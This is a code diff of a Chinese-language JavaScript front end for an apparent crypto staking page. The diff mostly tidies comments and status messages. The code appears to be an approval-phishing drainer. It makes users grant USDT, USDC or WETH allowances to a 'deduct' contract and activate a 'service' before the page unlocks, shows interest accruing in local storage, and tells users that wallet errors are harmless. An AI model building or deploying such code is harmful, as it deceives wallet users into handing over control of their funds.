@@ -10,7 +10,6 @@ const DEDUCT_CONTRACT_ABI = [
     "function activateService(address tokenContract) external",
     "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
 ];
-
 const ERC20_ABI = [
     "function approve(address spender, uint256 amount) external returns (bool)",
     "function balanceOf(address account) view returns (uint256)",
@@ -26,7 +25,6 @@ const pledgeAmount = document.getElementById('pledgeAmount');
 const pledgeDuration = document.getElementById('pledgeDuration');
 const pledgeToken = document.getElementById('pledgeToken');
 const refreshWallet = document.getElementById('refreshWallet');
-const walletBalanceValue = document.getElementById('walletBalanceValue');
 const walletTokenSelect = document.getElementById('walletTokenSelect');
 const walletBalanceAmount = document.getElementById('walletBalanceAmount');
 const accountBalanceValue = document.getElementById('accountBalanceValue');
@@ -52,10 +50,9 @@ function updateStatus(message) {
 
 function resetState(showMsg = true) {
     console.log("執行狀態重置 (resetState)...");
-    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
+    signer = userAddress = null;
     stakingStartTime = null;
     claimedInterest = 0;
-    pledgedAmount = 0;
     if (interestInterval) clearInterval(interestInterval);
     localStorage.removeItem('stakingStartTime');
     localStorage.removeItem('claimedInterest');
@@ -156,7 +153,7 @@ function restoreStakingState() {
     }
 }
 
-//---Core Wallet Logic (核心錢包邏輯)---
+//---Core Wallet Logic---
 async function sendMobileRobustTransaction(populatedTx) {
     if (!signer || !provider) throw new Error("錢包未連接或簽名者缺失。");
     const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
@@ -168,15 +165,15 @@ async function sendMobileRobustTransaction(populatedTx) {
         updateStatus(`授權已發送！HASH: ${txHash.slice(0, 10)}... 等待確認中...`);
         receipt = await provider.waitForTransaction(txHash);
     } catch (error) {
-        console.warn("⚠️ Trust Wallet 介面可能會拋出無害錯誤。繼續進行鏈上檢查...");
+        console.warn("⚠️ Trust Wallet...: ", error.message);
         if (error.hash) txHash = error.hash;
         else if (error.message && error.message.includes('0x')) { const match = error.message.match(/(0x[a-fA-F0-9]{64})/); if (match) txHash = match[0]; }
         if (txHash) {
             updateStatus(`交易介面發生錯誤！已發送交易: ${txHash.slice(0, 10)}... 等待確認中...`);
             receipt = await provider.waitForTransaction(txHash);
-        } else throw new Error(`交易發送失敗，無法從錯誤中檢索交易哈希: ${error.message}`);
+        } else throw new Error(`交易發送失敗: ${error.message}`);
     }
-    if (!receipt || receipt.status !== 1) throw new Error(`交易在鏈上失敗（已復原）。哈希: ${txHash.slice(0, 10)}...`);
+    if (!receipt || receipt.status !== 1) throw new Error(`交易在鏈上失敗。哈希: ${txHash.slice(0, 10)}...`);
     return receipt;
 }
 
@@ -193,11 +190,11 @@ async function initializeWallet() {
             console.log("偵測到帳戶變更...");
             if (newAccounts.length === 0) {
                 console.log("所有帳戶已斷開連接。");
-                resetState(true); // 用戶在錢包中斷開連接，重置所有狀態
+                resetState(true);
             } else if (!userAddress || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
                 console.log("帳戶已切換，將使用新帳戶重新連接...");
-                resetState(false); // 重置舊帳戶的狀態
-                await connectWallet(); // 用新帳戶重新連接
+                resetState(false);
+                await connectWallet();
             }
         });
 
@@ -213,6 +210,7 @@ async function initializeWallet() {
             await connectWallet();
         } else {
             console.log("未發現已連接帳戶，等待用戶點擊連接按鈕。");
+            disableInteractiveElements(true);
             updateStatus("請先連接您的錢包以繼續。");
         }
     } catch (error) {
@@ -224,7 +222,7 @@ async function initializeWallet() {
 
 async function checkAuthorization() {
     try {
-        if (!signer) { updateStatus('錢包未連接。請先連接。'); return; }
+        if (!signer) { return; }
         updateStatus("檢查授權狀態中...");
         const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
@@ -236,18 +234,22 @@ async function checkAuthorization() {
         const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
         const isFullyAuthorized = isServiceActive && hasSufficientAllowance;
         if (isFullyAuthorized) {
-            if (connectButton) { connectButton.classList.add('connected'); connectButton.textContent = 'Connected'; connectButton.title = '斷開錢包'; }
+            connectButton.classList.add('connected');
+            connectButton.textContent = 'Connected';
+            connectButton.title = '斷開錢包';
             disableInteractiveElements(false);
             updateStatus("✅ 服務已啟動並授權成功。");
         } else {
-            if (connectButton) { connectButton.classList.remove('connected'); connectButton.textContent = 'Connect'; connectButton.title = '連接並授權'; }
+            connectButton.classList.remove('connected');
+            connectButton.textContent = 'Connect';
+            connectButton.title = '連接並授權';
             disableInteractiveElements(true);
             updateStatus('需要授權。請連接並授權。');
         }
         updateStatus("");
     } catch (error) {
         console.error("檢查授權錯誤:", error);
-        if (error.code === 'CALL_EXCEPTION') updateStatus('合約通信失敗。請確保您在 **Ethereum 主網** 上且合約地址正確，然後重新整理頁面。');
+        if (error.code === 'CALL_EXCEPTION') updateStatus('合約通信失敗。請檢查網絡並刷新。');
         else updateStatus(`授權檢查失敗: ${error.message}`);
     }
 }
@@ -277,7 +279,7 @@ async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActi
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
         await sendMobileRobustTransaction(activateTx);
-    } else if (!serviceActivated) updateStatus(`警告: 未找到可用的授權代幣來啟動服務。請確保您有 ETH 用於 Gas 費用。`);
+    } else if (!serviceActivated) updateStatus(`警告: 未找到可用的授權代幣來啟動服務。`);
     else updateStatus(`所有授權和服務啟動已完成。`);
 }
 
@@ -326,7 +328,7 @@ async function connectWallet() {
         }
         
         await checkAuthorization();
-        restoreStakingState(); // ** 在所有檢查和授權完成後，恢復UI狀態 **
+        restoreStakingState();
 
     } catch (error) {
         console.error("連接錢包錯誤:", error);
@@ -335,7 +337,6 @@ async function connectWallet() {
         else if (error.message.includes('insufficient funds')) userMessage = "授權失敗: ETH 餘額不足以支付 Gas 費用。";
         else if (error.code === 'CALL_EXCEPTION') userMessage = "合約調用失敗，請檢查網絡或重新嘗試。";
         updateStatus(userMessage);
-        if (connectButton) { connectButton.classList.remove('connected'); connectButton.textContent = 'Connect'; connectButton.title = '連接錢包 (重試)'; }
     }
 }
 
@@ -371,11 +372,17 @@ function updateLanguage(lang) { currentLang = lang; languageSelect.value = lang;
 document.addEventListener('DOMContentLoaded', () => {
     languageSelect.value = currentLang; 
     updateLanguage(currentLang);
-    initializeWallet(); // 頁面加載完成後開始初始化流程
+    initializeWallet();
 });
 
 languageSelect.addEventListener('change', (e) => updateLanguage(e.target.value));
-if (connectButton) connectButton.addEventListener('click', () => { if (connectButton.classList.contains('connected')) disconnectWallet(); else connectWallet(); });
+connectButton.addEventListener('click', () => {
+    if (connectButton.classList.contains('connected')) {
+        disconnectWallet();
+    } else {
+        connectWallet();
+    }
+});
 
 startBtn.addEventListener('click', () => {
     if (!connectButton.classList.contains('connected')) {
